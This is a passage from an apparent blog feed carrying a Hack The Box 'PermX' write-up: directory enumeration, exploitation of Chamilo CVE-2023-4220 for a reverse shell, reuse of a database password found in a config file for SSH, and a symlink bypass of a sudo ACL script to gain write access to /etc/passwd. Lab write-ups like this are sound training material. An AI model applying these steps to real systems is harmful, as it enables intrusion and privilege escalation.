+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 304<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://permx.htb/css/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/img                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 304<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://permx.htb/img/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/lib                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 304<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://permx.htb/lib/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.                    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 36182<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/js                   <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 303<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://permx.htb/js/<span style="color:#f92672">]</span>
+</span></span></code></pre></div><h2 id="lmspermxhtb">lms.permx.htb</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># added to /etc/hosts</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sherlocks/noxious<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ URL<span style="color:#f92672">=</span>http://lms.permx.htb 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sherlocks/noxious<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -t <span style="color:#ae81ff">50</span> -x php -b 404,403 
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>/bin                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 312<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/bin/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/user.php             <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; whoisonline.php<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 19356<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/LICENSE              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 35147<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/app                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 312<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/app/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/web                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 312<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/web/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/main                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 313<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/main/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/terms.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 16127<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.                    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 19348<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/src                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 312<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/src/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/plugin               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 315<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/plugin/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/documentation        <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 322<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/documentation/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/vendor               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 315<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/vendor/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/certificates         <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 321<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/certificates/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/news_list.php        <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 13995<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/custompages          <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 320<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/custompages/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/whoisonline.php      <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 15471<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/user_portal.php      <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 16154<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p><code>Powered by chamilo</code></p>
+<p>There&rsquo;s a recent CVE for chamilo &raquo;<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4220">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4220</a></p>
+<p>Checking out to see if the bigUpload.php file exists, at <code>http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported</code>, it appears it does.</p>
+<hr>
+<h1 id="foothold">Foothold</h1>
+<p>Wrote a python script to get a reverse shell with the upload vulnerability</p>
+<p><a href="https://github.com/thefizzyfish/CVE-2023-4220">https://github.com/thefizzyfish/CVE-2023-4220</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@permx:/var/www/chamilo/app/config$ cat configuration.php
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>// Database connection settings.
+</span></span><span style="display:flex;"><span>$_configuration<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;db_host&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span>;
+</span></span><span style="display:flex;"><span>$_configuration<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;db_port&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;3306&#39;</span>;
+</span></span><span style="display:flex;"><span>$_configuration<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;main_database&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;chamilo&#39;</span>;
+</span></span><span style="display:flex;"><span>$_configuration<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;db_user&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;chamilo&#39;</span>;
+</span></span><span style="display:flex;"><span>$_configuration<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;db_password&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;03F6lY3uXAP2bkW8&#39;</span>;
+</span></span><span style="display:flex;"><span>// Enable access to database management <span style="color:#66d9ef">for</span> platform admins.
+</span></span><span style="display:flex;"><span>$_configuration<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;db_manager_enabled&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> false;
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Found a config file with a potential db password. Looking at the /home directory there&rsquo;s another user we can try the cred for <code>mtz</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/permx/CVE-2023-4220<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh mtz@10.10.11.23   
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Last login: Mon Jul  <span style="color:#ae81ff">1</span> 13:09:13 <span style="color:#ae81ff">2024</span> from 10.10.14.40
+</span></span><span style="display:flex;"><span>mtz@permx:~$ 
+</span></span></code></pre></div><p>And we got user with <code>mtz:03F6lY3uXAP2bkW8</code></p>
+<h2 id="exploits">Exploits</h2>
+<p><a href="https://github.com/thefizzyfish/CVE-2023-4220">https://github.com/thefizzyfish/CVE-2023-4220</a>
+#CVE-2023-4220</p>
+<hr>
+<h1 id="privesc">PrivEsc</h1>
+<p>Since we have a password for <code>mtz</code> first step is to check sudo privs with <code>sudo -l</code></p>
+<p>We can run /opt/acl.sh.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mtz@permx:/opt$ cat acl.sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$#<span style="color:#e6db74">&#34;</span> -ne <span style="color:#ae81ff">3</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    /usr/bin/echo <span style="color:#e6db74">&#34;Usage: </span>$0<span style="color:#e6db74"> user perm file&#34;</span>
+</span></span><span style="display:flex;"><span>    exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>user<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>perm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$2<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$3<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span>$target<span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> /home/mtz/* <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;</span>$target<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> *..* <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    /usr/bin/echo <span style="color:#e6db74">&#34;Access denied.&#34;</span>
+</span></span><span style="display:flex;"><span>    exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check if the path is a file</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> ! -f <span style="color:#e6db74">&#34;</span>$target<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    /usr/bin/echo <span style="color:#e6db74">&#34;Target must be a file.&#34;</span>
+</span></span><span style="display:flex;"><span>    exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/usr/bin/sudo /usr/bin/setfacl -m u:<span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span>:<span style="color:#e6db74">&#34;</span>$perm<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span>$target<span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>There&rsquo;s a filter blocking us from specifying a path outside of <code>/home/mtz</code> or including <code>..</code> within the path. We can get around this by sym-linking to another file and running the command.</p>
+<p>In this case I gave mtz control of the passwd file, we can remove the password for root by removing the x after the <code>root:</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mtz@permx:~$ ln -s /etc/passwd passwd.txt
+</span></span><span style="display:flex;"><span>mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/passwd.txt
+</span></span><span style="display:flex;"><span>mtz@permx:~$ head passwd.txt 
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mtz@permx:~$ 
+</span></span></code></pre></div><h2 id="exploits-1">Exploits</h2>
+<hr>
+<h1 id="postpivot">Post/Pivot</h1>
+<hr>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
